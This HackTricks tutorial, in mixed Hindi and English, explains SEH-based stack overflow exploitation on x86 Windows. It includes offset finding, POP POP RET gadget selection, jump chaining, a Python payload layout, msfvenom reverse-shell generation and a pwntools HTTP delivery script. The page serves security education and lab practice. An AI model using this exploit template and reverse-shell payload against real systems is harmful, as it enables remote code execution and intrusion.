# Windows SEH-based Stack Overflow Exploitation (nSEH/SEH)

{{#include ../../banners/hacktricks-training.md}}

SEH-based exploitation एक क्लासिक x86 Windows technique है जो stack पर संग्रहीत Structured Exception Handler chain का दुरुपयोग करती है। जब एक stack buffer overflow दो 4-byte फील्ड्स को overwrite कर देता है

- nSEH: pointer to the next SEH record, and
- SEH: pointer to the exception handler function

एक attacker execution को निम्न तरीकों से नियंत्रित कर सकता है:

1) SEH को एक non-protected module में मौजूद POP POP RET gadget के address पर सेट करना, ताकि जब exception dispatch हो तो gadget attacker-controlled bytes में return करे, और  
2) nSEH का उपयोग करके execution को redirect करना (आम तौर पर एक short jump) overflowing बड़े buffer में जहाँ shellcode स्थित है वापस ले जाना।

This technique विशेष रूप से 32-bit processes (x86) के लिए है। आधुनिक सिस्टम पर, gadget के लिए SafeSEH और ASLR न होने वाला module पसंद करें। Bad characters अक्सर 0x00, 0x0a, 0x0d (NUL/CR/LF) शामिल होते हैं, जो C-strings और HTTP parsing के कारण होते हैं।

---

## Finding exact offsets (nSEH / SEH)

- Process को crash कराएँ और पुष्टि करें कि SEH chain overwrite हुआ है (उदाहरण के लिए, x32dbg/x64dbg में SEH view चेक करें)।
- Overflowing data के रूप में एक cyclic pattern भेजें और उन दो dword के offsets compute करें जो nSEH और SEH में land करते हैं।

Example with peda/GEF/pwntools on a 1000-byte POST body:
```bash
# generate pattern (any tool is fine)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# or
python3 -c "from pwn import *; print(cyclic(1000).decode())"

# after crash, note the two 32-bit values from SEH view and compute offsets
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x32424163   # nSEH
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 0x41484241   # SEH
# ➜ offsets example: nSEH=660, SEH=664
```
उन स्थानों पर मार्कर रखकर सत्यापित करें (उदा., nSEH=b"BB", SEH=b"CC"). क्रैश को पुनरुत्पादित करने के लिए कुल लंबाई स्थिर रखें।

---

## POP POP RET (SEH gadget) चुनना

SEH फ्रेम को अनवाइंड करने और आपके nSEH बाइट्स में लौटने के लिए आपको POP POP RET sequence की आवश्यकता होती है। इसे ऐसे मॉड्यूल में ढूँढें जिसमें SafeSEH न हो और आदर्श रूप से ASLR न हो:

- Mona (Immunity/WinDbg): `!mona modules` फिर `!mona seh -m modulename`.
- x64dbg plugin ERC.Xdbg: `ERC --SEH` POP POP RET gadgets और SafeSEH status दिखाने के लिए।

ऐसा address चुनें जिसमें little-endian में लिखने पर कोई badchars न हों (उदा., `p32(0x004094D8)`). यदि protections अनुमति दें तो vulnerable binary के अंदर के gadgets को प्राथमिकता दें।

---

## Jump-back technique (short + near jmp)

nSEH केवल 4 बाइट का होता है, जो अधिकतम 2-बाइट के short jump (`EB xx`) और padding के लिए फिट होता है। यदि आपको अपने buffer के start तक पहुँचने के लिए सैकड़ों बाइट पीछे कूदना पड़ता है, तो nSEH के ठीक पहले रखा गया 5-बाइट का near jump उपयोग करें और nSEH से एक short jump के साथ इसे chain करें।

nasmshell के साथ:
```text
nasm> jmp -660           ; too far for short; near jmp is 5 bytes
E967FDFFFF
nasm> jmp short -8       ; 2-byte short jmp fits in nSEH (with 2 bytes padding)
EBF6
nasm> jmp -652           ; 8 bytes closer (to account for short-jmp hop)
E96FFDFFFF
```
nSEH को offset 660 पर रखते हुए 1000-byte payload के लिए लेआउट विचार:
```python
buffer_length = 1000
payload  = b"\x90"*50 + shellcode                    # NOP sled + shellcode at buffer start
payload += b"A" * (660 - 8 - len(payload))           # pad so we are 8 bytes before nSEH
payload += b"\xE9\x6F\xFD\xFF\xFF" + b"EEE"     # near jmp -652 (5B) + 3B padding
payload += b"\xEB\xF6" + b"BB"                      # nSEH: short jmp -8 + 2B pad
payload += p32(0x004094D8)                           # SEH: POP POP RET (no badchars)
payload += b"D" * (buffer_length - len(payload))
```
निष्पादन प्रवाह:
- Exception उत्पन्न होता है, dispatcher ओवरराइट किए गए SEH का उपयोग करता है।
- POP POP RET हमारे nSEH में अनवाइंड होता है।
- nSEH `jmp short -8` निष्पादित करता है, जो 5-byte near jump में जाता है।
- Near jump हमारे buffer की शुरुआत पर लैंड करता है जहाँ NOP sled + shellcode मौजूद हैं।

---

## Bad characters

एक पूरा badchar string बनाएं और crash के बाद stack memory की तुलना करें, उन bytes को हटा दें जो target parser द्वारा mangled हो जाती हैं। HTTP-based overflows के लिए, `\x00\x0a\x0d` लगभग हमेशा exclude किए जाते हैं।
```python
badchars = bytes([x for x in range(1,256)])
payload  = b"A"*660 + b"BBBB" + b"CCCC" + badchars  # position appropriately for your case
```
---

## Shellcode निर्माण (x86)

अपने badchars के साथ msfvenom का उपयोग करें। एक छोटा NOP sled लैंडिंग विचलन सहन करने में मदद करता है।
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f python -v sc
```
यदि आप रन-टाइम पर जनरेट कर रहे हैं, तो hex format Python में embed और unhex करने के लिए सुविधाजनक है:
```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> \
-b "\x00\x0a\x0d" -f hex
```
---

## HTTP के माध्यम से डिलीवर करना (precise CRLF + Content-Length)

जब कमजोर वेक्टर HTTP request body हो, तो सटीक CRLFs और Content-Length के साथ एक raw request तैयार करें ताकि सर्वर पूरे ओवरफ़्लो हो रहे body को पढ़ सके।
```python
# pip install pwntools
from pwn import remote
host, port = "<TARGET_IP>", 8080
body = b"A" * 1000  # replace with the SEH-aware buffer above
req = f"""POST / HTTP/1.1
Host: {host}:{port}
User-Agent: curl/8.5.0
Accept: */*
Content-Length: {len(body)}
Connection: close

""".replace('\n','\r\n').encode() + body
p = remote(host, port)
p.send(req)
print(p.recvall(timeout=0.5))
p.close()
```
---

## Tooling

- x32dbg/x64dbg — SEH chain को देखने और crash का प्राथमिक विश्लेषण करने के लिए।
- ERC.Xdbg (x64dbg plugin) — SEH gadgets को सूचीबद्ध करने के लिए: `ERC --SEH`.
- Mona as an alternative: `!mona modules`, `!mona seh`.
- nasmshell — short/near jumps assemble करने और raw opcodes कॉपी करने के लिए।
- pwntools — precise network payloads तैयार करने के लिए।

---

## Notes and caveats

- केवल x86 processes पर लागू होता है। x64 एक अलग SEH scheme का उपयोग करता है और SEH-based exploitation आम तौर पर व्यवहार्य नहीं होती।
- SafeSEH और ASLR के बिना modules में मौजूद gadgets को प्राथमिकता दें; अन्यथा, process में लोड किया गया कोई unprotected module ढूँढें।
- ऐसे service watchdogs जो crash पर स्वचालित रूप से restart करते हैं, iterative exploit development को आसान बना सकते हैं।

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf)](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [ERC.Xdbg – Exploit Research Plugin for x64dbg (SEH search)](https://github.com/Andy53/ERC.Xdbg)
- [Corelan – Exploit writing tutorial part 7 (SEH)](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-7-unicode-0day-buffer-overflow-seh-and-venetian-shellcode/)
- [Mona.py – WinDbg/Immunity helper](https://github.com/corelan/mona)

{{#include ../../banners/hacktricks-training.md}}
